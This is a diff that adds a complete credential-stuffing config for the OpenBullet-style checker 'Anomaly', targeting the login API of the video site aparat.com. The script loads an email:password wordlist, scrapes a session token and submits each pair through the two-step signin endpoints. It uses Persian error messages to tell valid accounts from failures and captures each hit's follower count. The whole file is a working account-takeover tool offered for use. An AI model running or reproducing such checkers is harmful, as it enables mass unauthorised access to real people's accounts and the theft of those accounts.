@@ -1,0 +1,115 @@
+[SETTINGS]
+{
+  "Name": "Aparat",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2020-07-20T19:36:33.876648+02:00",
+  "AdditionalInfo": "",
+  "Author": "@esfelurm",
+  "Version": "1.4.3 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET REQUEST GET "https://www.aparat.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Token PARSE "<SOURCE>" LR " guid: \"" "\"" -> VAR "Token" 
+
+#POST_TEMP1 REQUEST POST "https://www.aparat.com/api/fa/v1/user/Authenticate/auth" 
+  CONTENT "{\"guid\":\"<Token>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: www.aparat.com" 
+  HEADER "Origin: https://www.aparat.com" 
+  HEADER "Referer: https://www.aparat.com/login" 
+
+#TMP1 PARSE "<SOURCE>" JSON "temp_id" -> VAR "TMP1" 
+
+REQUEST POST "https://www.aparat.com/api/fa/v1/user/Authenticate/signin_step1" 
+  CONTENT "{\"account\":\"<USER>\",\"temp_id\":\"<TMP1>\",\"guid\":\"<Token>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: www.aparat.com" 
+  HEADER "Origin: https://www.aparat.com" 
+  HEADER "Referer: https://www.aparat.com/login" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "errors" 
+    KEY "کاربر پیدا نشد!" 
+  KEYCHAIN Success OR 
+    KEY "authenticate" 
+
+#TMP2 PARSE "<SOURCE>" JSON "temp_id" -> VAR "TMP2" 
+
+#POST_PASS REQUEST POST "https://www.aparat.com/api/fa/v1/user/Authenticate/signin_step2" 
+  CONTENT "{\"temp_id\":\"<TMP2>\",\"account\":\"<USER>\",\"codepass_type\":\"pass\",\"code\":\"<PASS>\",\"guid\":\"<Token>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: www.aparat.com" 
+  HEADER "Origin: https://www.aparat.com" 
+  HEADER "Referer: https://www.aparat.com/signin/password" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "رمز عبور صحیح نمی باشد" 
+    KEY "errors" 
+  KEYCHAIN Success OR 
+    KEY "authenticate" 
+
+#Capture REQUEST GET "https://www.aparat.com/statistics" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Follower PARSE "<SOURCE>" LR "<span class=\"number\">" "</span></div>" CreateEmpty=FALSE -> CAP "Follower" 
+
